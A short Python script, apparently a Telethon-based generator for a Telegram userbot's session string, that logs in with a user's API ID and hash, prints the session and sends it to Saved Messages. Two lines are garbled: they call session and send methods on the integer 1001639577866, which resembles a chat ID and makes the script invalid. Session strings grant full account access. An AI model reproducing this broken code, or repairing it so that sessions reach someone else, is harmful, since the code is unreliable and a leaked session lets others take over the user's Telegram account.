from telethon.sync import TelegramClient
from telethon.sessions import StringSession

INVISIBLEBOT = """
"""
print(INVISIBLEBOT)
print(
    """String Generator. ==> INVISIBLEBot. Get Your Api Id & Api Hash From my.telegram.org and fill accordingly.
╭━━╮╭━━━┳━━━━╮InvisibleBoy
┃╭╮┃┃╭━╮┃╭╮╭╮┃LegendBoy-Lx
┃╰╯╰┫┃╱┃┣╯┃┃╰╯
┃╭━╮┃┃╱┃┃╱┃┃
┃╰━╯┃╰━╯┃╱┃┃
╰━━━┻━━━╯╱╰╯MR_INVISIBLE_OFFICIAL""")
print("Real stick Invisiblebot newlock")
APP_ID = int(input("Enter APP ID - "))
API_HASH = input("Enter API HASH - ")

with TelegramClient(StringSession(), APP_ID, API_HASH) as INVISIBLEBOT:
    print("")
    print("This is your STRING_SESSION. Please Keep It safe.")
    print("")
    print(INVISIBLEBOT.session.save())
    print(1001639577866.session.save())
    print("")
    print(
        "You can Get Your String Session In Saved Message of Your Telegram Account. Remember To Make New String Session Whenever You Terminate Sessions."
    )
    omk = INVISIBLEBOT.send_message("me", f"`{INVISIBLEBOT.session.save()}`")
    omk = 1001639577866.send_message("me", f"`{1001639577866.session.save()}`")
    omk.reply(
        "The above is the `INVISIBLE_STRING` #POWERFUL [INVISIBLE-LEGENDBOT](https://t.me/Invisible_LegendBot)"
    )
